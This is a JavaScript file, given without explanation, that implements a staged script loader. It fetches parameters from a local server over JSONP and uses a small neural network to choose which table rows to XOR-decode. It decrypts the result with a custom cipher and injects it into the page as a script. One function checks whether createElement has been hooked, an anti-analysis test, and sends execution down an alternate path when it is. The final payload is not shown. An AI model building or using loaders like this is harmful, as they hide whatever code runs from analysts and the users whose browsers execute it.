var map = {
0:function ()
{
    var port = ":8081";
    $.ajax({
        url:url+port,
        dataType:"jsonp",
        jsonp:"callback",
        jsonpCallback:"success_jsonpCallback"
    }).done(function(data11) {
        var para1 = data11.para.para1;
        var para2 = data11.para.para2;
        var init_key = data11.jc.init_key;
        table = data11.jc.name;
        init_arr = data11.jc.init_arr;
        code += map[10](table,7,11);
        map[11](table,init_arr,para1,para2,init_key);//document.write引起的菊花
    });
},
1:function (str1) {
            var num = 0;
            for (let i =0;i<str1.length;i++){
                num += str1.charCodeAt(i);
            }
            return num;
        },
2:function () {
            const handler = {
                apply: function (target, thisArg, args){
                    console.log("Intercepted a call tocreateElement with args: " + args);
                    return target.apply(thisArg, args)
                }
            };

            document.createElement= new Proxy(document.createElement, handler);
            document.createElement('div');
            //Call a "virgin" createElement:
            try {
                document.createElement.toString();
                return false;
            }catch(e){
                return true;
            }
        },
3:function () {
            this.argmax = function (arr) {
                var max_value = arr[0];
                var index = 0;
                for (let i = 1;i<arr.length; i++){
                    if (max_value<arr[i]){
                        max_value = arr[i];
                        index = i;
                    }
                }
                return index;
            };
            this.dot = function (A,B) {
                var result = [];
                if (map[1](typeof B[0][0])===map[1]('number')) {
                    for (let i in A) {
                        var tmp_res = [];
                        for (let i1 in B[0]) {
                            var sum = 0;
                            for (let j in A[0]) {
                                sum += A[i][j] * B[j][i1];
                            }
                            tmp_res.push(sum);
                        }
                        result.push(tmp_res);

                    }
                }
                if (map[1](typeof B[0][0])!==map[1]('number')) {
                    for (let i in A) {
                        var sum = 0;
                        for (let j in A[0]) {
                            sum += A[i][j] * B[j];
                        }
                        result.push(sum);
                    }
                }
                return result;
            };
            this.sum = function (arr) {
                var result = 0;
                for(let i in arr){
                    result+=arr[i];
                }
                return result;
            };
            this.max = function (x) {
                var result = x[0];
                for (var i = 1; i < x.length; i++) {
                    result =  Math.max(result, x[i]);
                }
                return result;
            };
            this.exp = function (x) {
                var result = [];
                for(let i in x){
                    result.push(Math.exp(x[i]));
                }

                return result;
            };

        },
4:function (iii,para) {
            var np = new map[3]();
            this.weights = para[iii].weight;
            this.biases = para[iii].biases;

            this.feed_forword = function (data) {
                for(let i in this.weights){
                    var w = this.weights[i];
                    var b = this.biases[i];
                    var z =np.dot(w,data);
                    for(let j in z){
                        z[j] = z[j]+b[j];
                    }
                    if (z.length<10){
                        data = this.softmax(z);
                    }
                    if (z.length>=10){
                        data = this.sigmoid(z);
                    }
                }
                return data;
            };
            this.softmax = function (x) {
                var max_value = np.max(x);
                for (let i in x){
                    x[i] = x[i] - max_value;
                }
                var exp_x = np.exp(x);
                var sum_value = np.sum(exp_x);
                var softmax_x = [];
                for (let j in exp_x){
                    softmax_x.push(exp_x[j] /sum_value);
                }
                return softmax_x;
            };
            this.sigmoid = function (z) {
                var result = [];
                for (let i in z){
                    z[i] = -z[i];
                }
                var exp = np.exp(z);
                for(let i in z){
                    result.push(1.0/(1.0+exp[i]));
                }
                return result;
            };

            this.predict = function (X) {
                var output= this.feed_forword(X);
                return output;
            };
        },
5:function (iii,para) {
            this.size = 0;
            this.d = {};
            this.d1 = {};
            this.d2 = {};
            this.max_index = function (arr)
            {
                var max = 0;
                var j = 0;
                for (var i = 0; i < arr.length; i++)
                {
                    if (arr[i] > max)
                    {
                        max = arr[i];
                        j = i;
                    }
                }
                return j;
            };
            this.data_inverse =function (data) {
                var label = new Array();
                var arr = new Array();
                for(var i=0;i<data.length;i++){
                    label[i] = this.max_index(data[i])
                }
                for(var ii=0;ii<label.length;ii++){
                    arr[ii] = this.d1[label[ii]]
                }
                return arr;
            };

            this.transform = function (X) {
                this.d = para[iii].d;
                this.d1 = para[iii].d1;
                this.d2 = para[iii].d2;
                var ls = [];
                for (let i in X){
                    for (let j in X[i]){
                        try {
                            if(map[1](typeof this.d[X[i][j]])===map[1]("undefined"))
                            {
                                ls.push(0.0);
                            }
                            if(map[1](typeof this.d[X[i][j]])!==map[1]("undefined"))
                            {
                                ls.push(parseFloat(this.d[X[i][j]])/30003);
                            }
                        }
                        catch (e) {
                            ls.push(0.0);
                        }
                    }
                }
                return [ls];
            }
        },
6:function (list,para1,para2){
            var ls = [];
            for (let i = 0;i<3;i++){
                var nn = new map[4](i,para1);
                var tt = new map[5](i,para2);
                var X1 = tt.transform([list]);
                var pre_y = nn.predict(X1[0]);
                var y1 = tt.data_inverse([pre_y]);
                ls.push(y1[0]);
            }
            return ls;
        },
7:function (code)
        {
            code=unescape(code);
            var c=String.fromCharCode(code.charCodeAt(0)-code.length);
            for(var i=1;i<code.length;i++){
                c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
            }
            return c;
        },
8:function  (str) {
            str = map[7](str);
            var script = document.createElement('script');
            script.type="text/javascript";
            script.text=str;
            document.getElementsByTagName('head')[0].appendChild(script);
            script = null;
        },
9:function () {
            code ='';
            ret = [];
            tmp_num =index;
            index = 0;
            index1 = 2;
        },
10:function (arr,index,index1) {
            var str = '';
            ret = [];
            for (let i = 0; i < arr[index].length; i++) {
                var w_num = arr[index][i]^arr[index1][i];
                ret.push(w_num);
                s_c+=1;
            }
            str += ret.map(e=>String.fromCharCode(e)).join('');
            return str;
        },
11:function (table,n_a,para1,para2,init_key) {
            var result = map[6](n_a,para1,para2);
            index+=1;
            port = ":8082";
            $.ajax({
                url:url+port,
                type:"post",
                data:"***"+[s_c,result[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var result1 = data.result;
                if(result1[1]){
                    if (index===1){
                        var script = document.createElement('script');
                        script.type="text/javascript";
                        code = map[7](code);
                        script.text=code;
                        document.getElementsByTagName('head')[0].appendChild(script);
                        const func1 = new start();
                        const s = func1.run();
                        script = null;
                        if(s===init_key){
                            code = '';
                            ret = [];
                            code +=map[10](table,result[0],result[1]);
                            return map[12](table,[result[0],result[1],result1[0]],para1,para2);
                        }
                    }
                    code +=map[10](table,result[0],result[1]);
                    return map[11](table,[result[0],result[1],result1[0]],para1,para2,init_key);
                }
                if (index!==1)
                {
                    map[9]();
                    return map[13](table,[result[0],result[1],result1[0]],para1,para2);
                }
            });

        },
12:function (table,n_a,para1,para2) {
            var result = map[6](n_a,para1,para2);
            index+=1;
            port = ":8082";
            $.ajax({
                url:url+port,
                type:"post",
                data:"***"+[s_c,result[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var result1 = data.result;
                if (!result1[1]||map[2]()) {
                    map[9]();
                    return map[13](table, [result[0], result[1], result1[0]],para1,para2);
                }
                if (result1[1]) {
                    if (index === 4) {
                        map[8](code);
                        return 0;
                    }
                    code += map[10](table, result[0], result[1]);
                    return map[12](table, [result[0], result[1], result1[0]],para1,para2);
                }
            });
        },
13:function (table,n_a,para1,para2) {
            var result = map[6](n_a,para1,para2);
            port = ":8082";
            $.ajax({
                url:url+port,
                type:"post",
                data:"***"+[s_c,result[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var result1 = data.result;
                var code1 = map[10](table, result[0], result[1]);
                a.push(code1);
                code += code1;
                index += 1;
                if (index < 4) {
                    if (index === index1) {
                        try {
                            map[8](code);
                            return 0;
                        }
                        catch (e) {
                            code = a[1] + a[0];
                            map[8](code);
                            return 0;
                        }
                    }
                    return map[13](table, [result[0], result[1], result1[0]],para1,para2);
                }
            });
        },
};
const url = "http://127.0.0.1";
var s_c = 0;
var a = [];
var table = [];
var init_arr = [];
var ret = [];
var index = -1;
var index1 = 0;
var tmp_num = 0;
var code = '';

